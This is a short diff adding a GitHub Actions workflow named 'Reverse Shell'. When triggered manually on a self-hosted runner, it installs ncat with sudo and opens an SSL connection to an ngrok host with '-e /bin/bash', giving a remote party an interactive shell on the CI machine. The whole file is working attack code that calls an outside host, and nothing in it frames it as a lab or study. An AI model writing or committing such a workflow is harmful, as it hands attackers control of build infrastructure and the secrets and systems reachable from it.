@@ -1,0 +1,11 @@
+name: Reverse Shell
+
+on:
+    workflow_dispatch:
+
+jobs:
+  reverse:
+    runs-on: self-hosted
+    steps:
+      - run: sudo yum install -y nmap-ncat
+      - run: ncat 2.tcp.ngrok.io 17309 --ssl -e /bin/bash
